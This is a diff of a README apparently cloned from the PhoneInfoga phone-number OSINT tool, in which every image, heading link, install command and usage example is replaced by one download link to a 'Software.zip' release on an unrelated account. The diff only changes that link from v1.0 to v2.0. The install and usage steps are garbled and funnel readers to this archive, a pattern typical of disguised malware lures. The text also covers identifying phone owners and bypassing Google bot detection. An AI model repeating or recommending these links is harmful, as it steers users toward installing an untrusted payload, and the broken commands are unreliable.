@@ -1,14 +1,14 @@
 # PhoneInfoga
 
-![](https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip)
-![](https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip)
-![](https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip)
+![](https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip)
+![](https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip)
+![](https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip)
 
 Information gathering & OSINT reconnaissance tool for phone numbers.
 
 One of the most advanced tools to scan phone numbers using only free resources. The goal is to first gather basic information such as country, area, carrier and line type on any international phone numbers with a very good accuracy. Then try to determine the VoIP provider or search for footprints on search engines to try identify the owner.
 
-### [OSINT Tutorial: Building an OSINT Reconnaissance Tool from Scratch](https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip)
+### [OSINT Tutorial: Building an OSINT Reconnaissance Tool from Scratch](https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip)
 
 ## Features
 
@@ -18,7 +18,7 @@ One of the most advanced tools to scan phone numbers using only free resources. 
 - OSINT reconnaissance using external APIs, Google Hacking, phone books & search engines
 - Use custom formatting for more effective OSINT reconnaissance
 
-![](https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip)
+![](https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip)
 
 ## Formats
 
@@ -40,18 +40,18 @@ Use `any` to disable this feature. Default value: `all`
 ## Installation
 
 ```bash
-git clone https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip
+git clone https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip
 cd PhoneInfoga/
-python3 -m pip install -r https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip
+python3 -m pip install -r https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip
 ```
 
 ## Usage
 
 ```
-usage: https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip -n <number> [options]
+usage: https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip -n <number> [options]
 
 Advanced information gathering tool for phone numbers
-(https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip)
+(https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip)
 
 optional arguments:
   -h, --help            show this help message and exit
@@ -71,19 +71,19 @@ optional arguments:
 Example (quotes are optional, use it when typing special formats) :
 
 ```
-python3 https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip -n "(+42)837544833"
+python3 https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip -n "(+42)837544833"
 ```
 
 Check for a number range on OVH :
 
 ```
-python3 https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip -n +42837544833 -s ovh
+python3 https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip -n +42837544833 -s ovh
 ```
 
 Check several numbers at once :
 
 ```
-python3 https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip -i https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip -o https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip
+python3 https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip -i https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip -o https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip
 ```
 
 **Note: `--osint` is not compatible with `--output` option.**
@@ -91,7 +91,7 @@ python3 https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Softw
 Use all scanners and run OSINT reconnaissance :
 
 ```
-python3 https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip -n +42837544833 -s all --osint
+python3 https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip -n +42837544833 -s all --osint
 ```
 
 ## Formatting
@@ -105,11 +105,11 @@ E.164 formatting for phone numbers entails the following:
 
 For example, here’s a US-based number in standard local formatting: (415) 555-2671
 
-![](https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip)
+![](https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip)
 
 Here’s the same phone number in E.164 formatting: +14155552671
 
-![](https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip)
+![](https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip)
 
 In the UK, and many other countries internationally, local dialing may require the addition of a '0' in front of the subscriber number. With E.164 formatting, this '0' must usually be removed.
 
@@ -123,7 +123,7 @@ PhoneInfo use a workaround to handle Google bot detection. When running OSINT sc
 
 >When you search on Google using custom requests (Google Dorks), you get very easily blacklisted. So Google shows up a page where you have to complete a captcha to continue. As soon as the captcha is completed, Google create a cookie named "GOOGLE_ABUSE_EXEMPTION" which is used to whitelist your browser and IP address for some minutes. This temporary whitelist is enough to let you gather a lot of information from many sources. So I decided to add a simple user manipulation to bypass this bot detection. [...] So I'll just try make requests and wait until I get a 503 error, which means I got blacklisted. Then I ask the user to follow an URL to manually complete the captcha and copy the whitelist token to paste it in the CLI. The tool is now able to continue to scan!
 
-![](https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip)
+![](https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip)
 
 ### How to handle captcha
 - Follow the URL
@@ -132,7 +132,7 @@ PhoneInfo use a workaround to handle Google bot detection. When running OSINT sc
 - Go to **Storage**, then **Cookies**
 - Copy the value of the *GOOGLE_ABUSE_EXEMPTION* cookie and simply paste it in the CLI
 
-![](https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip)
+![](https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip)
 
 ### Troubleshooting
 
@@ -146,4 +146,4 @@ Sometimes the phone number has footprints but is used with a different formattin
 
 This tool is licensed under the GNU General Public License v3.0.
 
-[![FOSSA Status](https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip%https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip%2Fsundowndev%https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip)](https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip%https://github.com/gamblezclone/Phoneinfoga/releases/download/v1.0/Software.zip%2Fsundowndev%2FPhoneInfoga?ref=badge_large)
+[![FOSSA Status](https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip%https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip%2Fsundowndev%https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip)](https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip%https://github.com/gamblezclone/Phoneinfoga/releases/download/v2.0/Software.zip%2Fsundowndev%2FPhoneInfoga?ref=badge_large)
